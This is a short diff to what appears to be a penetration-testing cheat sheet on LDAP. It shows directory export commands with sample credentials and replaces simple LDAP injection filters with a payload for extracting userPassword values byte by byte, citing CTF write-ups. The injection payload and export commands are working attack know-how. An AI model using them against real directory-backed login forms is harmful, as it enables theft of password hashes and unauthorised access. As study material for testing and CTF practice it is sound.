@@ -15,6 +15,7 @@ ldapsearch -H ldap://192.168.122.55 -x -D 'SECURUS\Administrator' -w Password1 -
 ldifde -a "cn=Directory Manager" s3cr3t -s 172.10.10.11 -f d:\\path\\export.ldif -d ou=demo,ou=blah,dc=thecompany,dc=com
 ldifde -a cn=Administrateur,cn=users,dc=dc1,dc=myowndomain,dc=local Password1 -s 192.168.111.189 -f export.ldif
 
-# ldap injection
-vuln=*)(sn=
-vuln=*)!(sn=*
+# ldap injection vs. userPassword
+# https://infosecwriteups.com/davincictf-web-challenges-writeup-517e77d6fa39#706f https://0xukn.fr/posts/writeupecw2018admyssion/
+userPassword is an octet string so use the octetStringOrderingMatch operator (oid 2.5.13.18)
+email=victim@legit.com)(userPassword:2.5.13.18:=\7b\4d\44\35\7d\41\<add the next byte here>))%00&password=whatever
